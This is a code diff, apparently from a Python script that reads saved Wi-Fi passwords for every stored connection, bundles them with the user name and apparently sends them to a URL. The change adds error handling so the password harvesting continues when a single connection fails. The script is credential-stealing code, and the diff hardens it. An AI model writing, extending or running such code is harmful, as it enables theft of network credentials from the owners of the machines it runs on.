@@ -33,9 +33,13 @@ def password_pulling(connection):
 
 datas = [{'user':user}]
 for connection in connections:
-    data = password_pulling(connection)
-    datas.append(data)
-    
+    try:    
+        data = password_pulling(connection)
+        datas.append(data)
+    except:
+        data = {f"{connection} : Password Not Found"}
+        datas.append(data)
+        continue
 #if you want it to store in a text file use this
 # with open('wifi_passwords.txt' , 'a') as file:
 #     file.write(f'{datas} \n')
@@ -52,4 +56,3 @@ try:
         print('Something Went Wrong')
 except:
     print('Request Failed (Check URL)')
-    
